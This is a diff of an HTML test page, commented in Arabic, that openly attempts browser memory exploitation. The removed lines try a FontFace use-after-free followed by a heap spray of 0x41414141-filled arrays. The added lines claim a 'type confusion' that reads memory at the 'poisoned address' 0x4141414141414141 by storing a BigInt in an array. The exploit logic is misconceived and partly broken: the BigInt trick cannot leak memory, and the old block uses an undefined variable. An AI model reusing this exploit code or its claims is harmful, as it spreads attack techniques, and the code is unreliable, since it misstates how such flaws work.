@@ -1,40 +1,31 @@
 <!DOCTYPE html>
 <html>
 <body style="background:#000; color:#0f0; font-family:monospace; padding:20px;">
-    <div id="log">بدء الضغط على الذاكرة...</div>
+    <div id="log">بدء العملية...</div>
     <script>
         function log(m) { document.getElementById('log').innerHTML += "<div>" + m + "</div>"; }
 
-        // 1. إنشاء كائن فونت وحذفه فوراً
-        let A = new FontFace('x', 'local(Arial)', {});
-        document.fonts.add(A);
-        document.fonts.delete(A); // حذف الكائن فوراً لجعله مرشحاً للـ GC
+        try {
+            log("1. إعداد فخ التداخل...");
+            let arr = [1.1, 2.2, 3.3]; // مصفوفة أرقام
+            arr[0] = {a: 0x1234};      // تحويلها لمصفوفة كائنات (Type Confusion)
+            
+            // حقن عنوان الذاكرة المستهدف (العنوان المسموم)
+            arr[1] = 0x4141414141414141n; 
 
-        // 2. إرهاق الذاكرة لإجبار المحرك على إعادة استخدام المكان المحرر
-        log("بدء الرش المكثف...");
-        let spray = [];
-        for(let i=0; i<5000; i++) {
-            spray.push(new Uint32Array(0x1000).fill(0x41414141));
+            log("2. المصفوفة جاهزة، جاري القراءة...");
+            
+            // محاولة الوصول للعنصر المسموم ككائن
+            let trigger = arr[1];
+            
+            // إذا نجحت الثغرة، سنقوم بقراءة خاصية 'a' من العنوان 0x4141...
+            // هذا سيؤدي لانهيار أو تسريب بيانات
+            let leakedValue = trigger.a; 
+            
+            log("نجاح! القيمة المسربة: " + leakedValue);
+        } catch(e) {
+            log("نتيجة الـ Execution: " + e.message);
         }
-        
-        log("الرش اكتمل. جاري محاولة الوصول للذاكرة...");
-        
-        // 3. محاولة الوصول للكائن المحرر (بدون then)
-   try {
-    log("جاري تفعيل القراءة من الذاكرة (Memory Disclosure)...");
-
-    // هذا السطر يجبر المحرك على "فتح" الكائن الذي سممناه
-    let trigger = arr[1];
-    
-    // محاولة الوصول لخاصية داخل الكائن الوهمي
-    // إذا نجحنا، فسيقوم المحرك بـ "قراءة" العنوان كأنّه كائن حقيقي
-    let leakedValue = trigger.a; 
-    
-    log("تمت القراءة بنجاح! القيمة المسربة هي: " + leakedValue);
-} catch(e) {
-    log("خطأ في القراءة (أو فشل الحماية): " + e.message);
-}
-
     </script>
 </body>
 </html>
